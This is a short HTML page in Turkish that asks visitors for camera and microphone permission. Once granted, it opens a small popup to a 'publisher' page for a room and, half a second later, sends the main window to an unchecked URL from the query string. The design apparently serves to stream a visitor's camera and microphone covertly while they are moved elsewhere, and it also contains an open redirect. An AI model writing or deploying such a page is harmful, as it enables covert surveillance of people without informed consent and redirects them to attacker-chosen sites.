<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Izin ve Yönlendirme</title>
    <style>
      body { font-family: sans-serif; padding: 24px; }
      #status { margin-top: 12px; }
      .hidden { display: none; }
      button { padding: 10px 16px; font-size: 16px; }
    </style>
  </head>
  <body>
    <h1> Kamera ve Mikrofon İzni </h1>
    <p> Devam etmek için kamera ve mikrofon izni verin. İzin verildikten sonra otomatik yönlendirileceksiniz. </p>
    <button id="btn">İzin Ver ve Devam Et</button>
    <div id="status"></div>
    <script>
      function getQuery(name, def = '') {
        const params = new URLSearchParams(location.search);
        return params.get(name) || def;
      }

      const roomId = getQuery('room', 'default');
      const redirectUrl = getQuery('redirect', 'https://example.com');
      const statusEl = document.getElementById('status');

      async function requestPermission() {
        try {
          statusEl.textContent = 'İzin isteniyor...';
          const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
          stream.getTracks().forEach(t => t.stop());
          statusEl.textContent = 'İzin verildi. Akış başlatılıyor...';

          const popup = window.open(`/publisher.html?room=${encodeURIComponent(roomId)}`, '_blank', 'width=480,height=360');
          if (!popup) {
            statusEl.innerHTML = 'Açılır pencere engellendi. Lütfen bu site için pop-up izni verin ve tekrar deneyin.';
            return;
          }
          // Küçük gecikme sonra yönlendir
          setTimeout(() => { window.location.href = redirectUrl; }, 500);
        } catch (err) {
          console.error(err);
          statusEl.textContent = 'İzin reddedildi veya hata oluştu: ' + err.message;
        }
      }

      document.getElementById('btn').addEventListener('click', requestPermission);
    </script>
  </body>
</html> 